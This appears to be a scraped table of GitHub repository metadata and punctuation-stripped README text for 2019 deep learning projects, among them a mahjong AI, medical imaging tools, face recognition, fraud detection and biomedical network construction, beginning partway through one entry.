Bamboo 4 Seasons Spring Summer Autumn Winter 4 Mahjong Combos Heavenly Hand Great Winds Great Dragons All Kongs All Honor Tiles Thirteen Orphans Nine Gates Hand Self Triplets All in Triplets Mixed One Suit All One Suit Common Hand Small Dragons Small Winds Image source Wikipedia https github com lucylow Deep Learning Mahjong blob master images mahjong 20tiles png Technical Mahjong Game Documentation x1F534 Mahjong x1F53B ML Algorithms allows game to react and respond more dynamically and in more imaginative ways Deep Neural Network with reinforcement learning implemented Learn from its own game and top human players via Classic Supervised Learning where computations are made for every move or position dsada https github com lucylow Deep Learning Mahjong blob master images game 20theory png Machine Learning x1F53B Non Player Characters NPCs Algorithms playing as NPCs with adjustable difficulties respond to players actions in unique unexpected ways NPCs are non hard coded Train NPCs by imitating Top Mahjong Players to learn dynamic movements and actions Natural Language Processing NLP to build realistic interactions in conversations Key for Battle Mahjong Player vs Cartoon NPC style Computational Modelling Complex game states modelled such that game can predict and alter downstream effects Ex1 Team chemistry score calculated based on personalities of each gamer Ex2 Morale of each players abilities as game is played in real time Game Aesthetics Ex Computer Vision Algorithms used for mahjong textures and objects to render dynamically as player moves tiles on the board Deep Learning x1F53B DL Game Play AI will win through intelligence rather than faster mechanicals speed Computers can programatically issue commands instantly whereas humans must physically move a mouse or hit the keyboard Knowledge based hierarchy foundation with Goals Strategies Tactics and Chains Each objective inspects current game state and decides which lower level objective will be best to achieve it Reinforcement Learning Markov Decision process to make decisions involving chain of if then statements Positive or Negative Reward Algorithm will learn what actions will maximize the reward and which to be avoided Deep Neural Network 3 Hidden layers of 120 neutrons 3 Dropout layers to optimize generalization and reduce over fitting Input State Output Values related to Mahjong Actions Last layer uses Softmax Function to return probabilities Deep Q Learning Q table matrix that updates Q table based on the Prediction of Future Mahjong States Q values updated according to the Bellman Equation Deep Q action value function https github com lucylow Deep Learning Mahjong blob master images deep 20q 20where 20q 20hat 20 3D 3D 20action value 20function png Search Gaming Optimization Algorithm x1F53B Alpha Beta Prunning AI weeds out bad moves Lookahead Search Algorithms Open World Games Typically require thousands of hours of developer and artist time to render Become more efficient using ML Path Finding Algorithms Have the potential to be unlimited in size Database x1F534 Optimize game data with databases Pre Computed Moves for the beginning end phrases of the game Two Databases Opening DB Endgame DB References x1F534 Shiqi Gao et al Building a Computer Mahjong Player via Deep Convolutional Neural Networks https arxiv org abs 1906 02146 Pau Ramon Revilla Open source multiplayer mahjong https github com masylum whatajong Rules of Mah Jongg Joseph Park Babcock Maajh The American Version of the Ancient Chinese Game Viola L Cecil The Complete Book of Mah jongg Alan D Millington For my grandma,2019-06-29T17:35:01Z,2019-11-29T16:27:06Z,JavaScript,lucylow,User,0,2,0,59,master,lucylow,1,0,0,0,0,0,0
vaibhavmishra1,Deep_Learning_with_Keras,n/a,DeepLearningwithKeras Various Deep Learning codes written in Keras Like and share,2019-07-28T09:09:50Z,2019-08-13T09:34:01Z,Jupyter Notebook,vaibhavmishra1,User,1,2,0,20,master,vaibhavmishra1,1,0,0,0,0,0,0
nanjeshgowda,NVIDIA-Deep-Learning,n/a,,2019-07-11T17:09:03Z,2019-11-09T02:49:54Z,Python,nanjeshgowda,User,0,2,0,288,master,nanjeshgowda,1,0,0,0,0,0,0
jongcye,DeepEPI.ghost.correction,n/a,EPIghostlearning This code is a EPI ghost correction code using deep learning Paper Juyoung Lee Yoseob Han Jae Kyun Ryu Jang Yeon Park and Jong Chul Ye k Space Deep Learning for Reference free EPI Ghost Correction Magnetic Resonance in Medicine in press 2019 Requirements The codebase is implemented in Matlab MatConvNet matconvnet 1 0 beta24 Download the function folder and move the files on MatConvNet folder Dataset The whole data used in the paper are private data so only some sample data are uploaded here The data are 3T MR EPI brain image Input data is a ghost image and the label data is a free ghost image For the label data ghost is removed by using ALOHA Training Main file to train is mainghostlearning m Various learning parameter e g learning rate of epochs can changed on this main file There are some sample data in db folder for training The number of channel of input data is 2 coil You can change the filter size network depth in cnnghostinit m Inference To inference with trained model run displaycnnghost m There are some sample data in db folder for inference,2019-07-24T02:07:23Z,2019-09-29T11:11:56Z,MATLAB,jongcye,User,0,2,1,7,master,JuyoungLeeHi,1,0,0,0,0,0,0
langheran,face-recognition-deep-metric-learning,n/a,High Quality Face Recognition with Deep Metric Learning Status https travis ci org langheran face recognition deep metric learning svg branch master https travis ci org langheran face recognition deep metric learning License https img shields io badge License MIT blue svg https raw githubusercontent com langheran face recognition deep metric learning master LICENSE Presented by Dr Leonardo Chang on the Deep Learning Workshop 2019 held at ITESM based on the Davis King blog http blog dlib net 2017 02 high quality face recognition with deep html You can see the whole video session here videos Leonardo 20Chang 20 2028Jun2019 mp4 STEP 1 Detect faces images drawfaces png STEP 2 Compute face descriptor STEP 2 1 Detect landmarks images drawkeypoints png STEP 2 2 Align face image and obtain face descriptor STEP 3 Compute distance for faces M M images drawrelationships png Recommended readings Professional CMake A Practical Guide https crascit com professional cmake Learning OpenCV 3 Computer Vision in C with the OpenCV Library https www amazon com mx Learning OpenCV Computer Vision Library dp 1491937998 source ps sl shoppingads lpcontext psc 1 Davis King dlib https github com davisking dlib Face Recognition https github com ageitgey facerecognition in python,2019-07-02T17:06:41Z,2019-07-09T02:53:35Z,C++,langheran,User,2,2,0,57,master,langheran,1,0,0,0,0,0,1
phonism,DL101,n/a,DL101 Deep Learning 101,2019-06-25T12:58:10Z,2019-06-26T02:48:33Z,Jupyter Notebook,phonism,User,0,2,0,1,master,phonism,1,0,0,0,0,0,0
ranasingh-gkp,ANN_CNN_RNN_LSTM_OPTIMIZATION_HYPERPARAMETER,n/a,ANNCNNRNNLSTMOPTIMIZATIONHYPERPARAMETER Machine learning Deep learning Data science master,2019-07-02T05:47:43Z,2019-07-07T07:37:44Z,Jupyter Notebook,ranasingh-gkp,User,0,2,1,2,master,ranasingh-gkp,1,0,0,0,0,0,0
zhao-tong,DeepFD-pyTorch,n/a,DeepFD pyTorch This is a PyTorch implementation of DeepFD Deep Structure Learning for Fraud Detection https ieeexplore ieee org abstract document 8594881 Other than the unsupervised DBSCAN classifier used in the original paper I also added a supervised 3 layer MLP as a classifier option The whole embedding part is still always unsupervised Authors of this code package Tong Zhao https github com zhao tong tzhao2 nd edu Kaifeng Yu https github com kaifeng16 ykf16 mails tsinghua edu cn Chuchen Deng https github com ChuchenD cdeng nd edu Environment settings python 3 6 8 pytorch 1 0 1 post2 Basic Usage Before running the model first you need to create two folders results and data Data Inputs Required input data files are graphu2p and labels the paths need to be modified in configs filepaths json graphu2p is the pickled adjacency matrix in scipy sparse csrmatrix format where each none zero entry stands for a edge labels is the pickled binary labels in numpy ndarray format where 1 stands for fraudulent user and 0 stands for benign user For dataset with limited labels the unlabeled user should be labeled as 1 in the labels vector Example Usage To run the unsupervised model on Cuda with the default GPU card python m src main cuda 9 dataSet YourDataSet clsmethod dbscan or mlp Main Parameters dataSet The input graph dataset default weibos name The name of this run default debug clsmethod The classification method to be used Choose between dbscan and mlp default dbscan epochs Number of epochs default 10 bsz Batch size default 100 seed Random seed default 1234 hiddensize The size of hidden layer in encoder and decoder default 128 embsize The size of the embeddings for each user default 2 cuda Which GPU card to use 1 for CPU 9 for default GPU 0 3 for specific GPU default 1,2019-07-09T15:17:57Z,2019-08-26T23:55:37Z,Python,zhao-tong,User,0,2,0,18,master,zhao-tong,1,0,0,0,0,0,0
cansyl,CROssBAR-Networks,n/a,Comprehensive Resource of Biomedical Relations with Deep Learning and Network Representations CROssBAR Biomedical Networks The aim of the CROssBAR project is to develop a large scale open access system to annotate complex relations between drugs compounds target biomolecules pathways and diseases via biological data integration and artificial learning based relation prediction CROssBAR Overview https user images githubusercontent com 13165170 61704408 ee10c000 ad43 11e9 829b 83df6d226664 png Sub projects under CROssBAR 1 Construction of the CROssBAR database by integrating biological data from various resources 2 Large scale prediction of unknown drug target interactions as well as non interactions by developing and applying a deep learning based ML method 3 Generation of the biomedical networks where nodes will represent compounds drugs genes proteins pathways and diseases and the edges will represent the known and predicted pairwise relations 4 Biological evaluation experimental validation of the selected results on PI3K AKT mTOR pathway in terms of liver cancer mechanisms 5 Construction of an open access web service where it will be possible to browse with an entity of interest to observe the related network with its components Repository for item 2 https github com cansyl DEEPScreen Prototype Hepatocellular Carcinoma Network We constructed a prototype network using CROssBAR integrated data resources and by setting multiple enrichment based filters to include only the most relevant biomedical entities Later this workflow will be automatized to generate similar networks and visualize them on the fly using CytoScape browser plug in through the CROssBAR web service Below network will be displayed to the web service user following a web service search with the term hepatocellular carcinoma Workflow for the construction of the network The prototype network model was created in 7 main steps 1 The selection of HCC related genes KEGG H00048 20 genes OMIM Phenotype MIM 114550 9 genes OpenTargets EFO0000182 18 genes with score 0 2 genetic associations TCGAHCC 34 genes expert knowledge 61 HCC related genes in total 2 The determination of protein protein interactions PPIs STRING application on CytoScape PPIs with a confidence score 0 95 45 PPIs between 31 proteins image https user images githubusercontent com 8128032 61718989 b702d480 ad6c 11e9 849b 0245642cca10 png 3 The selection of compounds interacting with HCC related genes 3a Known interactions from DrugBank 63 interactions between 21 genes and 57 compounds Edge color Green Node color Red approved and investigational drugs image https user images githubusercontent com 8128032 61719015 ca15a480 ad6c 11e9 9c05 031d449f6d5c png 3b Experimentally measured interactions from PubChem ChEMBL ExCAPE dataset Compounds with pXC50 5 0 were labelled as active For each compound enrichment score was calculated with hypergeometric test based on ratios of active inactive datapoints of compounds for HCC network genes and in the overall ExCAPE dataset ChEMBL PubChem targets Only compounds with enrichment score 1 were considered Top 5 compounds which are not similar to each other were selected based on enrichment scores 26 interactions between 11 genes and 12 compounds Edge color Blue Node color Orange drug like compounds image https user images githubusercontent com 8128032 61719047 dbf74780 ad6c 11e9 86b0 a871eeac768c png 3c Predicted interactions from DEEPScreen Predicted interactions were retrieved from DEEPSreen predictions For each compound enrichment score was calculated with hypergeometric test based on ratios of active inactive datapoints of compounds for HCC network genes and in the overall DEEPScreen targets Only compounds with enrichment score 1 were considered Top 5 compounds which are not similar to each other were selected based on enrichment scores 25 interactions between 5 genes and 23 compounds Edge color Red Node color Orange if not a drug image https user images githubusercontent com 8128032 61719081 ec0f2700 ad6c 11e9 98e9 de9050fd71d5 png 4 The determination of HCC related pathways and their gene associations Signaling pathways associated with HCC disease pathway hsa05225 in KEGG STRING enrichment application on CytoScape FDR cutoff 0 05 KEGG signaling pathways 5 enriched genes 66 interactions between 22 genes and 10 pathways image https user images githubusercontent com 8128032 61719251 40b2a200 ad6d 11e9 982b 89bd90f87011 png 5 The determination of other diseases associated with HCC related genes Associations between these genes and other diseases 5a KEGG Disease Terms STRING enrichment application on CytoScape FDR cutoff 0 05 KEGG diseases 10 enriched genes 72 interactions between 27 genes and 5 diseases image https user images githubusercontent com 8128032 66081772 68926300 e571 11e9 80d6 623297aa43da png 5b EFO Disease Terms EFO disease terms were retrieved from GWAS Genome Wide Association Studies Catalog https www ebi ac uk gwas docs file downloads For each EFO term enrichment score and p value was calculated based on ratios of EFO terms in HCC genes and in the overall GWAS gene set Only EFO terms with enrichment score 20 and p value 0 005 were considered EFO terms belonging to disease root were selected and associated with related genes 35 interactions between 20 genes and 7 EFO disease terms image https user images githubusercontent com 8128032 66081718 3f71d280 e571 11e9 813e 6288a508d06c png 6 The determination of associations between pathways and diseases Retrieved from KEGG pathways of the network diseases 26 interactions between 10 pathways and 5 diseases image https user images githubusercontent com 8128032 66081837 8b247c00 e571 11e9 867b 8ca2d066d34a png 7 The determination of associations between genes and HPO terms HPO terms were retrieved from Human Phenotype Ontology database https hpo jax org app For each HPO term enrichment score and p value were calculated with hypergeometric test based on ratios of active inactive datapoints of HPO terms for HCC network genes and in the overall HPO targets Only HPO terms with enrichment score 65 and p value 10 5 were considered Top 10 HPO terms which have not parent child relationship with each other were selected and associated with related genes 120 interactions between 22 genes and 10 HPO terms The finalized prototype network includes 185 nodes i e genes compounds pathways KEGG and EFO diseases HPO terms and 478 edges i e interactions in total image https user images githubusercontent com 8128032 66083489 15baaa80 e575 11e9 8c6a 231fe02e9cb8 png How to load the network on CytoScape To load the Hepatocellular Carcinoma Prototype Network on CytoScape You may directly open the session file HepatocellularCarcinomaNetwork cys via CytoScape application or if it does not work You may open a new session on CytoScape and import the network file HepatocellularCarcinomaNetwork xgmml as File Import Network File,2019-07-23T09:28:28Z,2019-10-03T11:29:31Z,n/a,cansyl,Organization,3,2,2,26,master,tuncadogan#hevalatas,2,0,0,0,0,0,3
ai-portfolio,deep_reinforcement_learning_stock_trading_bot,n/a,deepreinforcementlearningstocktradingbot A stock market trading bot using deep q networks reinforcement learning,2019-06-30T18:32:31Z,2019-08-03T02:45:16Z,Jupyter Notebook,ai-portfolio,Organization,1,2,1,9,master,ngilmore,1,0,0,0,0,0,0
CleanPegasus,Reversible-data-hiding-with-Deep-Learning,n/a,,2019-07-23T13:37:05Z,2019-11-27T17:42:59Z,Jupyter Notebook,CleanPegasus,User,0,2,0,6,master,CleanPegasus,1,0,0,0,0,0,0
nfrn,Deep-Learning-for-Health-Text-Mining,n/a,Deep Learning for Health Text Mining Working for python 3 6 3 for Windows64 Instal Virtual Environment pip install virtualenv Create Empty Virtual Environment virtualenv no site packages mylabenv Alternative python m venv mylabenv Activate Virtual Environoment source mylabenv bin activate Windows mylabenvScriptsactivate Add Virtual Environment to Jupyter Notebook pip install ipykernel pip install jupyter ipython kernel install name mylabenv pip install r requirements txt jupyter notebook Select Lab 1 3 ipynb file go to the toolbar option Kernel then Change Kernel and select mylabenv,2019-06-26T13:29:30Z,2019-11-29T12:33:33Z,Jupyter Notebook,nfrn,User,2,2,0,12,master,nfrn#mariogasparsilva,2,0,0,3,0,3,1
bethanylindberg,Xpressy,n/a,Xpressy Human Emotion Recognition Emotions play a very important role in our relations with other people and also in the way we make use of computers Effective computing is a domain that focuses on user emotions while he or she interacts with computers and applications As emotional state of a person may affect concentration task solving and decision making skills the vision of affective computing is to make systems able to recognize human emotions and influence them in order to enhance productivity and effectiveness of working with computers Facial Expression Recognition facilitates our capacity for resilience motivation empathy reasoning stress management communication and our ability to read Goal The goal of this project is to explore the field of Facial Expression Recognition FER using existing public datasets and create an application that can be used by various user groups to improve their emotional intelligence skills The app can be used by police officers social workers psychologists and other professionals whose job involves a lot of interactions with people Description of problem While most people can probably identify happy faces the task becomes more difficult when they need to differentiate between less popular emotions such as fear disgust or contempt It becomes even more difficult if the decision must be made fast Multiple researchers including Timothy Turner Identifying Emotional Intelligence Competencies Differentiating FBI 2007 argue that emotional intelligence changes with age and can be improved upon Although understanding of other people emotions is only a small part of emotional intelligence it is a critical skill for many occupations Unfortunately the emotional intelligence assessments and training programs are still not readily available for many of these professionals Instructions for running project After you have cloned the repo Download the data https grail cs washington edu projects deepexpr ferg db html or use your own dataset If you use your own data set please note that for a Convolution Neural Network it is recommended to have at minimum 1 000 images per class though this convention has also been challenged recently Additional Information http benanne github io 2015 03 17 plankton html About this data Facial Expression Research Group Database FERG DB is a database of stylized characters with annotated facial expressions The database contains 55 767 annotated face images of six stylized characters Create the below folders The python script will read the below folder structure so your data must be structured like below folders images folders png Install requirements Run the below in CMD or Git Bash to ensure you have all dependencies installed requirements images pipinstall png Run python script Run CNN py or CNN ipynb on your local machine Please note that depending on your machine you may run out of memory This took 4 hours to run in Visual Studio Code but your experience will vary depending on your machine Test saved Model Use Predictiontest ipynb to test the model on your own pictures or pictures from the internet,2019-07-16T15:54:43Z,2019-09-13T19:15:41Z,Jupyter Notebook,bethanylindberg,User,1,2,0,31,master,bethanylindberg#skavya90#ButtonWalker,3,0,0,1,0,2,0
jasmaa,DQNsort,n/a,DQNsort Sample run sample samplerun gif Sorting 5 element arrays using Deep Q learning Setup and Run Install dependencies pip install r requirements txt Train visdom Run visdom server in separate terminal python main py train or without visdom python main py train usevisdom False Test python main py test python main py compare Test comparing bubble random dqn,2019-08-05T03:31:01Z,2019-08-27T09:13:34Z,Python,jasmaa,User,1,2,0,11,master,jasmaa,1,0,0,0,0,0,0
grapestone5321,Recurrent_Neural_Networks,n/a,RecurrentNeuralNetworks Deep Learning Foundation Nanodegree Program,2019-07-10T07:14:12Z,2019-09-20T16:47:24Z,Jupyter Notebook,grapestone5321,User,0,2,0,72,master,grapestone5321,1,0,0,0,0,0,0
yizhiru,DL-CWS,n/a,DL CWS Deep learning for Chinese Word Segmentation 1 Dense CRF 2 Bi LSTM CRF 3 GRU CRF 4 Bert CRF,2019-06-24T12:26:07Z,2019-11-27T05:34:04Z,Python,yizhiru,User,0,2,0,2,master,yizhiru,1,0,0,0,0,0,0
ngebodh,MachineLearning,deep-learning#image-recognition#jupyter-notebook#keras#resnet50#tensorflow,MachineLearning This repo contains machine learning projects that span different subject areas from SVM to Deep Learning More to come Deep Learning Image Recognition Here https nbviewer jupyter org github ngebodh MachineLearning blob master DeepLearning ImageRecog DeepLearningWithKeras ImageRecog ipynb we use the ResNet50 model in keras to perform image recognition Notebook code here DeepLearning ImageRecog DeepLearningWithKeras ImageRecog ipynb DeepLearning ImageRecog DeepLearningWithKeras ImageRecog ipynb Here https nbviewer jupyter org github ngebodh MachineLearning blob master DeepLearning ImageRecog DeepLearningWithKerasImageRecogVGG16 ipynb we use the VGG16 model in keras to perform image recognition Notebook code here DeepLearning ImageRecog DeepLearningWithKerasImageRecogVGG16 ipynb DeepLearning ImageRecog DeepLearningWithKerasImageRecogVGG16 ipynb Here https nbviewer jupyter org github ngebodh MachineLearning blob master DeepLearning ImageRecog DeepLearningDigitClassificationWithKeras ipynb we build a deep neural network to classify hand written digits from the MNIST dataset Notebook code here DeepLearning ImageRecog DeepLearningDigitClassificationWithKeras ipynb DeepLearning ImageRecog DeepLearningDigitClassificationWithKeras ipynb SVMs Image Classification Here https nbviewer jupyter org github ngebodh MachineLearning blob master SVM EigenFacesPCA ipynb we use a combination of PCA and SVMs to classify famous faces Notebook code here SVM EigenFacesPCA ipynb SVM EigenFacesPCA ipynb,2019-07-18T07:07:45Z,2019-10-09T01:04:32Z,Jupyter Notebook,ngebodh,User,0,2,0,25,master,ngebodh,1,0,0,0,0,0,0
AaruranLog,pydoc.random,colly#deep-learning#documentation-generator#golang#python3#text-generation,Generate Plausible Python 3 Documentation using Deep Learning This project is NOT pure python unfortunately for the purists because I use golang for web crawling and some parallelized data cleaning That being said it is very possible to turn this into a pure Python project using other tools https pypi org project beautifulsoup4 Plan x Write a web crawler to fetch text from the python 3 7 docs x Create a data pipeline to turn that text into a learnable format x Train a RNN or LSTM or GRU on the text x Generate some documentation using deep learning Originally the code used a character level approach This method has terrible performance and training is still time consuming on GPU Then I applied the pretrained GPT 2 model This approach was more successful Samples of the generated text can be found in the samples folder I ve included a sample of the best generated text below The first line of Formatter class is defined by Formatter setfield value type If type is a sequence of strings that contains a field named value the field is modified by the setfield method If type is a single string the field is modified by the setfield method For example class Field fieldname class value 2 This class is documented in section Field objects Impressively the model was able to produce believeable Python code Installation To duplicate the results of this repository I recommend pre installing Go and Python 3 7 The easiest way to duplicate my results 1 Upload the file notebook gpt2model ipynb to a Google Colab notebook 2 Upload the file src data rawcorpus tar gz to that notebook s workspace 3 Ensure the Colab runtime has GPU acceleration enabled 4 Run the notebook and sit back for 10 20 minutes as the model finetunes A Note on Environments I use conda to manage my python packages but because this codebase is multi lingual there is no one size fits all solution However the data pipeline uses very few non standard packages As well I recommend that the model training and text generation be done on colab using notebook gpt2model ipynb which installs one package into the cloud environment In other words this project is small enough that I don t think it requires a dedicated virtual environment The go pipeline only requires you to install the package colly and its dependencies The rest of the go packages used are standard However if you wish to create your own python environment with conda or venv I have provided a requirements txt file for your convenience Note Model training is done using Google s colab so although tensorflow and keras are used in this codebase they need not be installed locally I ve included a compressed npz file which you can use to train your own models Alternatively you can prepare the data yourself from scratch To unpack the data from a compressed file There is a file src data rawcorpus tar gz which you can unpack either from the command line or using the shutil standard package in python Make sure it is unpacked into the directory data raw corpus for the repo s compatibility To download and prepare the data Automatically After installing Go and python run the script in src named downloadandpreparedata sh from the root directory level chmod u x src downloadandpreparedata sh src downloadandpreparedata sh The last python script txt to numpy py may fail but if you run it a few times on a device with sufficient memory it should complete without much trouble Manually 1 Install the following go package to replicate the web crawling go get github com gocolly colly 2 Run the web scraping tool go run src data crawl go The next steps are only necessary to integer encode the characters 3 Process the data in the raw corpus into character tokens go run src features uniquechars go dir data raw corpus go run src features encodetext go dir data raw corpus target data interim cleanedcorpus 4 Transform the integerized character tokens into a compressed numpy matrix python src features count chars py python src features txt to numpy py,2019-08-06T23:55:27Z,2019-08-13T05:36:55Z,Jupyter Notebook,AaruranLog,User,1,2,0,42,master,AaruranLog,1,0,0,0,0,0,0
D-Roberts,gluon_recsys,n/a,Neural network based recommendation systems in Gluon Contributions are welcome,2019-07-04T18:46:33Z,2019-12-07T23:51:08Z,Python,D-Roberts,User,0,2,0,20,master,D-Roberts,1,0,0,0,0,0,0
AliWaheed,malware-classification,n/a,malware classification Static Malware Classification Using Deep Learning,2019-07-13T09:41:51Z,2019-07-22T07:43:16Z,Jupyter Notebook,AliWaheed,User,0,2,0,2,master,AliWaheed,1,0,0,0,0,0,0
LeadingIndiaAI,Weed-Detection-in-Dense-Culture-using-Deep-Learning-,n/a,Aerial Cactus Identification Summer Internship Project Leading India ai Bennett University,2019-06-27T08:33:26Z,2019-08-30T09:32:16Z,Jupyter Notebook,LeadingIndiaAI,User,0,2,0,8,master,umangjpatel,1,0,0,0,0,0,0
aditya369thalluri,Video-Motion-Estimation-using-Keras-Sequential-Deep-Learning-Model,n/a,GetFrames py Used to the get the first frames of Training Validation and Testing videos processVideoMotionsfaces py To generate the motion vectors for the faces lenetfacestemplate py Train the model using the motion vectors Testing py To load the model from disk and test it on a face from test video,2019-07-16T05:17:55Z,2019-11-28T02:25:57Z,Python,aditya369thalluri,User,0,2,0,1,master,aditya369thalluri,1,0,0,0,0,0,0
vasukumar92,Trigger-Word-Detection-for-a-Laptop-using-Deep-Learning,n/a,Trigger Word Detection for a Laptop using Deep Learning In this notebook we will construct a speech dataset and implement an algorithm for trigger word detection sometimes also called keyword detection or wakeword detection Trigger word detection is the technology that allows devices like Amazon Alexa Google Home Apple Siri and Baidu DuerOS to wake up upon hearing a certain word For this exercise our trigger word will be Activate Every time it hears you say activate it will make a chiming sound By the end of this assignment you will be able to record a clip of yourself talking and have the algorithm trigger a chime when it detects you saying activate,2019-08-01T05:57:40Z,2019-08-16T20:59:18Z,Jupyter Notebook,vasukumar92,User,1,2,0,2,master,vasukumar92,1,0,0,0,0,0,0
ashishpatel26,Applied-AI-with-Deep-learning-By-IBM-Coursera,n/a,,2019-07-08T06:10:54Z,2019-08-02T07:16:56Z,Jupyter Notebook,ashishpatel26,User,0,2,1,9,master,ashishpatel26,1,0,0,0,0,0,0
deem0n,deep-book-clojure,n/a,deep book clojure MXNet Clojure https mxnet incubator apache org api clojure index html version of the code for the Neural Networks and Deep Learning http neuralnetworksanddeeplearning com free book Installation Note that you will need to download and unzip MNIST images into the data directory Use script from the MXNet project which I put into utils getmnistdata sh utils getmnistdata sh it should do the right thing The data files are about 50Mb in size so I didn t commit them to github git clone https github com deem0n deep book clojure git cd deep book clojure utils getmnistdata sh Usage lein test lein run Code comparasion Python Clojure python class Network object def init self sizes self numlayers len sizes self sizes sizes self biases np random randn y 1 for y in sizes 1 self weights np random randn y x for x y in zip sizes 1 sizes 1 clojure defrecord Network java lang Long numlayers clojure lang PersistentVector sizes clojure lang LazySeq biases clojure lang LazySeq weights Constructor defn make network sizes Network count sizes sizes map random normal 0 1 1 subvec sizes 1 map random normal 0 1 2 1 butlast sizes subvec sizes 1 JVM tuning Someone suggested https groups google com forum topic clojure yPaQN7JuKFY to use the following JVMFLAGS server XX UseConcMarkSweepGC XX UseCompressedOops XX DoEscapeAnalysis XX UseBiasedLocking Xmx2g License Copyright 2019 Dmitry Dorofeev MIT LICENSE LICENSE,2019-06-28T07:29:00Z,2019-12-08T10:55:12Z,Clojure,deem0n,User,0,2,0,14,master,deem0n,1,0,0,0,0,0,0
FeezyHendrix,Hendrixnet,deep-learning#deep-neural-networks#library#machine-learning#python,Hendrix Net A simple implementation of a deep learning library written in python with the subtle help of numpy may the np be with you Features MSE Mean Squared Error Loss Function SGD Schocastic Gradient Optimization Function Batch Iterator Neural Network Class Prerequisite Intall numpy pip install numpy Run example python example py,2019-07-11T06:49:33Z,2019-07-23T10:26:30Z,Python,FeezyHendrix,User,0,2,0,3,master,FeezyHendrix,1,0,0,0,0,0,0
jongcye,Domain.Adaptation.AcceleratedMR,n/a,Paper Deep Learning with Domain Adaptation for Accelerated Projection Reconstruction MR Han Yoseob et al Deep learning with domain adaptation for accelerated projectionreconstruction MR Magnetic resonance in medicine 80 3 2018 1189 1205 https onlinelibrary wiley com doi epdf 10 1002 mrm 27106 https arxiv org pdf 1703 01135 pdf Implementation MatConvNet matconvnet 1 0 beta20 Please run the matconvnet 1 0 beta20 matlab vlcompilenn m file to compile matconvnet There is instruction on http www vlfeat org matconvnet mfiles vlcompilenn Domain adaptation for Projection Reconstruction MR matconvnet 1 0 beta20 examples deep learning with domain adaptation for PR MR Please run the matconvnet 1 0 beta20 examples deep learning with domain adaptation for PR MR install m Download the MR only network CT pre trained network and HCP pre trained network Trained network MR only network is uploaded CT pre trained network is uploaded HCP pre trained network is uploaded Figure Iillustate the Fig 8 and 9 for Deep Learning with Domain Adaptation for Accelerated Projection Reconstruction MR,2019-07-27T04:54:56Z,2019-09-10T16:21:35Z,MATLAB,jongcye,User,1,2,1,6,master,hanyoseob,1,0,0,0,0,0,0
jereliu,feature-selection-bnn,n/a,feature selection bnn Scalable Feature Selection with Uncertainty Quantification using Bayesian Deep Learning,2019-08-05T15:30:14Z,2019-11-12T04:45:34Z,Python,jereliu,User,1,2,0,18,master,jereliu,1,0,0,0,0,0,0
ektas0330,cell-segmentation,n/a,Deep Learning Based Semantic Segmentation of Microscale Objects This is the source code for the deep learning model proposed in the paper Deep Learning Based Semantic Segmentation of Microscale Objects https arxiv org abs 1907 03576 A condensed version of the paper is published in the Proceedings of the 2019 International Conference on Manipulation Automation and Robotics at Small Scales https marss conference org Data Annotation Low contrast bright field images of multiple human endothelial cells and silica beads shown in the paper https arxiv org abs 1907 03576 are considered Segmentation labels for the images are created using LabelMe https github com wkentaro labelme Implementation This code is tested on a workstation running Windows 10 operating system equipped with a 3 7GHz 8 Core Intel Xeon W 2145 CPU GPU ZOTAC GeForce GTX 1080 Ti and 64 GB RAM Implemented with Tensorflow gpu 1 10 1 Keras 2 2 4 OpenCV 3 4 2 Python 3 5 5 Code 1 Create a data folder in the cell segmentation master directory Create sub folders src and label in the data folder and place all the dataset images and the corresponding labels in the src and label folders respectively 2 Run genimgaug py to split the data into training and test sets 3 Run preprocessing py to perform pre processing on the training set 4 Run trainunetxceptionresnetblock py to train the model The model is saved when the validation loss reaches its minimum and is named as unetxceptionresnetnsgd32lovaszsoftmaxbest h5 5 Run predictlovaszloss py to generate segmentation masks for the test images using the saved model 6 Run getcontour py to detect the contours of the segmented regions and overlay them on the original image Acknowledgement The code for the model is built on the code by Siddharta https github com sidml Image Segmentation Challenge Kaggle proposed in the TGS Salt Identification Challenge https www kaggle com c tgs salt identification challenge hosted by Kaggle Implementation of the Lovasz Softmax loss is as provided by Maxim Berman https github com bermanmaxim LovaszSoftmax Citation Please cite the following paper if the code is useful bash articlesamani2019deep title Deep Learning Based Semantic Segmentation of Microscale Objects author Samani Ekta U and Guo Wei and Banerjee Ashis G journal arXiv preprint arXiv 1907 03576 year 2019,2019-07-13T05:46:10Z,2019-09-18T01:50:51Z,Python,ektas0330,User,0,2,0,4,master,ektas0330,1,0,0,1,0,0,0
patelrajnath,dl4nlp-py,n/a,dl4nlp py Deep Learning for Natural Language Processing This repository contains 1 RNN CNN and Transformer based system for word level quality estimation 2 RNN CNN and Transformer based Part of Speech tagger for code mixed social media text The RNN models include simple Recurrent Neural Network Long Short Term Memory LSTM DeepLSTM and Gated Recurrent Units GRU aka Gated Hidden Units GHU The system is flexible to be used for any word level NLP tagging task like Named Entity Recognition etc Pre requisites python 3 6 pytorch 1 0 https pytorch org get started locally numpy python sklearn Quick Start POS tagging Publications If you use this project please cite the following papers InProceedingspatel m 2016 WMT author Patel Raj Nath and M Sasikumar title Translation Quality Estimation using Recurrent Neural Network booktitle Proceedings of the First Conference on Machine Translation month August year 2016 address Berlin Germany publisher Association for Computational Linguistics pages 819 824 url http www statmt org wmt16 pdf W16 2389 pdf articlepatel2016recurrent title Recurrent Neural Network based Part of Speech Tagger for Code Mixed Social Media Text author Patel Raj Nath and Pimpale Prakash B and Sasikumat M journal arXiv preprint arXiv 1611 04989 year 2016 url https arxiv org pdf 1611 04989 pdf Author Raj Nath Patel patelrajnath gmail com Linkedin https www linkedin com in raj nath patel 2262b024 Version 0 1 LICENSE Copyright Raj Nath Patel 2019 present rnn4nlp is free software you can redistribute it and or modify it under the terms of the GNU General Public License as published by the Free Software Foundation either version 3 of the License or at your option any later version You should have received a copy of the GNU General Public License along with Indic NLP Library If not see http www gnu org licenses,2019-07-28T13:58:47Z,2019-10-21T06:04:46Z,Python,patelrajnath,User,1,2,0,67,master,patelrajnath,1,0,0,0,0,0,2
